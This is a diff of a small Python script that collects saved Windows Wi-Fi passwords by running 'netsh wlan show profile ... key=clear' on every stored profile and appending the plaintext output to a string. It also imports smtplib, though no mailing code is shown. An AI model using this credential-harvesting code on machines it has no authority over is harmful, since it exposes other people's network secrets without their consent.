@@ -1,5 +1,10 @@
 #!/usr/bin/python
 
+# wifiPass - Extract Wifi passwords in Windows to file.
+# Author: Ethan Smith
+# Usage: python .\wifiPass2file.py
+# Python 3
+
 import subprocess, smtplib, re
 from termcolor import colored
 
@@ -12,7 +17,7 @@ passwd = ""
 
 for wlan in wifi_list:
     strip_r = wlan.strip('\r')
-    passwd_find = "netsh wlan show profile " + "\"" + str(strip_r) + "\"" + " key=clear"
+    passwd_find = f"netsh wlan show profile \"{str(strip_r)}\"  key=clear"
     wifi_result = subprocess.check_output(passwd_find, shell=True)
     passwd += str(wifi_result)
 
